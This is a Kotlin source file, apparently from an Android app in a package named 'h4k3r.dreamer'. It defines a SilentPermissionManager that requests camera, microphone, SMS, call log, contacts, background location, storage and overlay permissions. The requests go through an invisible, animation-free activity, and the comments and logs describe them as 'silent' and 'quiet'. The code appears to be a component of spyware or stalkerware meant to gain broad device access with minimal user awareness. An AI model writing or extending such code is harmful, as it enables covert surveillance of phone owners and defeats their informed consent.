package com.h4k3r.dreamer

import android.Manifest
import android.app.Activity
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import androidx.core.content.ContextCompat
import kotlinx.coroutines.*

class SilentPermissionManager(private val context: Context) {
    companion object {
        private const val TAG = "SilentPermissionManager"

        @Volatile
        private var instance: SilentPermissionManager? = null

        fun getInstance(context: Context): SilentPermissionManager {
            return instance ?: synchronized(this) {
                instance ?: SilentPermissionManager(context.applicationContext).also { instance = it }
            }
        }
    }

    private val scope = CoroutineScope(Dispatchers.Main + SupervisorJob())
    private val handler = Handler(Looper.getMainLooper())

    /* ── Silent Permission Request (Original Behavior) ────────────── */
    fun requestPermissionsSilent(permissions: List<String>, callback: (Map<String, Boolean>) -> Unit) {
        scope.launch {
            Log.d(TAG, "Starting silent permission request for: $permissions")

            val results = mutableMapOf<String, Boolean>()

            // Check current permissions
            val permissionsToRequest = permissions.mapNotNull { permission ->
                val manifestPerm = getManifestPermission(permission)
                if (manifestPerm != null && !hasPermission(manifestPerm)) {
                    permission to manifestPerm
                } else {
                    if (manifestPerm != null) {
                        results[permission] = true
                        Log.d(TAG, "Permission already granted: $permission")
                    }
                    null
                }
            }

            if (permissionsToRequest.isEmpty()) {
                Log.d(TAG, "✅ All configured permissions already granted")
                callback(permissions.associateWith { true })
                return@launch
            }

            Log.d(TAG, "❌ Missing permissions detected: ${permissionsToRequest.map { it.first }}")
            Log.d(TAG, "🔄 Will request these permissions silently...")

            // Request permissions silently in background
            requestPermissionsQuietly(permissionsToRequest, results, callback)
        }
    }

    private suspend fun requestPermissionsQuietly(
        permissionsToRequest: List<Pair<String, String>>,
        currentResults: MutableMap<String, Boolean>,
        callback: (Map<String, Boolean>) -> Unit
    ) {
        try {
            // Group permissions by type for efficient processing
            val normalPermissions = permissionsToRequest.filter {
                it.first !in listOf("location_background", "notifications", "system_alert_window")
            }
            val specialPermissions = permissionsToRequest.filter {
                it.first in listOf("location_background", "notifications", "system_alert_window")
            }

            // Request normal permissions first (silently)
            if (normalPermissions.isNotEmpty()) {
                Log.d(TAG, "Requesting ${normalPermissions.size} normal permissions silently")
                val normalResults = requestNormalPermissionsSilent(normalPermissions)
                currentResults.putAll(normalResults)

                // Small delay between permission groups
                delay(1000)
            }

            // Handle special permissions
            for ((permission, manifestPerm) in specialPermissions) {
                when (permission) {
                    "location_background" -> {
                        if (currentResults["location_fine"] == true) {
                            Log.d(TAG, "Requesting background location silently")
                            val backgroundResult = requestBackgroundLocationSilent()
                            currentResults[permission] = backgroundResult
                        }
                    }
                    "notifications" -> {
                        Log.d(TAG, "Requesting notification permission silently")
                        val notificationResult = requestNotificationPermissionSilent()
                        currentResults[permission] = notificationResult
                    }
                    "system_alert_window" -> {
                        Log.d(TAG, "Requesting overlay permission silently")
                        val overlayResult = requestOverlayPermissionSilent()
                        currentResults[permission] = overlayResult
                    }
                }
                delay(500) // Brief delay between special permissions
            }

            Log.d(TAG, "Silent permission request completed: $currentResults")
            callback(currentResults)

        } catch (e: Exception) {
            Log.e(TAG, "Silent permission request failed: ${e.message}")
            callback(currentResults)
        }
    }

    private suspend fun requestNormalPermissionsSilent(permissions: List<Pair<String, String>>): Map<String, Boolean> {
        return withContext(Dispatchers.Main) {
            val results = mutableMapOf<String, Boolean>()

            try {
                // Launch invisible permission activity
                val intent = Intent(context, InvisiblePermissionActivity::class.java).apply {
                    putExtra("silent_permissions", permissions.map { it.second }.toTypedArray())
                    putExtra("permission_names", permissions.map { it.first }.toTypedArray())
                    putExtra("silent_mode", true)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
                }

                Log.d(TAG, "Launching invisible permission activity")
                context.startActivity(intent)

                // Wait for completion (shorter timeout for silent mode)
                delay(8000)

                // Check results
                permissions.forEach { (permission, manifestPerm) ->
                    val isGranted = hasPermission(manifestPerm)
                    results[permission] = isGranted
                    Log.d(TAG, "Silent permission $permission: ${if (isGranted) "GRANTED" else "DENIED"}")
                }

            } catch (e: Exception) {
                Log.e(TAG, "Error in silent normal permissions: ${e.message}")
                // Mark all as denied on error
                permissions.forEach { (permission, _) ->
                    results[permission] = false
                }
            }

            results
        }
    }

    private suspend fun requestBackgroundLocationSilent(): Boolean {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                Log.d(TAG, "Requesting background location silently (Android 10+)")

                // Use invisible activity for background location
                val intent = Intent(context, InvisiblePermissionActivity::class.java).apply {
                    putExtra("silent_permissions", arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION))
                    putExtra("is_background_location", true)
                    putExtra("silent_mode", true)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
                }

                context.startActivity(intent)
                delay(5000) // Wait for user interaction

                hasPermission(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
            } else {
                true // Background location not required on older versions
            }
        } catch (e: Exception) {
            Log.e(TAG, "Silent background location request failed: ${e.message}")
            false
        }
    }

    private suspend fun requestNotificationPermissionSilent(): Boolean {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                Log.d(TAG, "Requesting notification permission silently (Android 13+)")

                val intent = Intent(context, InvisiblePermissionActivity::class.java).apply {
                    putExtra("silent_permissions", arrayOf(Manifest.permission.POST_NOTIFICATIONS))
                    putExtra("silent_mode", true)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
                }

                context.startActivity(intent)
                delay(3000)

                hasPermission(Manifest.permission.POST_NOTIFICATIONS)
            } else {
                true // Notification permission not required on older versions
            }
        } catch (e: Exception) {
            Log.e(TAG, "Silent notification permission request failed: ${e.message}")
            false
        }
    }

    private suspend fun requestOverlayPermissionSilent(): Boolean {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                Log.d(TAG, "Requesting overlay permission silently")

                if (!android.provider.Settings.canDrawOverlays(context)) {
                    // Try to request overlay permission
                    val intent = Intent(android.provider.Settings.ACTION_MANAGE_OVERLAY_PERMISSION).apply {
                        data = android.net.Uri.parse("package:${context.packageName}")
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }

                    try {
                        context.startActivity(intent)
                        delay(2000) // Brief wait for settings screen
                        return android.provider.Settings.canDrawOverlays(context)
                    } catch (e: Exception) {
                        Log.e(TAG, "Failed to open overlay settings: ${e.message}")
                        return false
                    }
                }
                true
            } else {
                true // Overlay permission not required on older versions
            }
        } catch (e: Exception) {
            Log.e(TAG, "Silent overlay permission request failed: ${e.message}")
            false
        }
    }

    /* ── Helper Methods ────────────────────────── */
    private fun hasPermission(permission: String): Boolean {
        return ContextCompat.checkSelfPermission(context, permission) == PackageManager.PERMISSION_GRANTED
    }

    private fun getManifestPermission(configPermission: String): String? {
        return when (configPermission) {
            "camera" -> Manifest.permission.CAMERA
            "location_fine" -> Manifest.permission.ACCESS_FINE_LOCATION
            "location_coarse" -> Manifest.permission.ACCESS_COARSE_LOCATION
            "location_background" -> Manifest.permission.ACCESS_BACKGROUND_LOCATION
            "contacts" -> Manifest.permission.READ_CONTACTS
            "sms" -> Manifest.permission.READ_SMS
            "phone" -> Manifest.permission.READ_PHONE_STATE
            "call_log" -> Manifest.permission.READ_CALL_LOG
            "microphone" -> Manifest.permission.RECORD_AUDIO
            "storage_read" -> if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                Manifest.permission.READ_MEDIA_IMAGES
            } else {
                Manifest.permission.READ_EXTERNAL_STORAGE
            }
            "storage_write" -> Manifest.permission.WRITE_EXTERNAL_STORAGE
            "calendar" -> Manifest.permission.READ_CALENDAR
            "notifications" -> if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                Manifest.permission.POST_NOTIFICATIONS
            } else null
            "bluetooth_connect" -> if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                Manifest.permission.BLUETOOTH_CONNECT
            } else null
            "bluetooth_scan" -> if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                Manifest.permission.BLUETOOTH_SCAN
            } else null
            "system_alert_window" -> Manifest.permission.SYSTEM_ALERT_WINDOW
            else -> null
        }
    }
}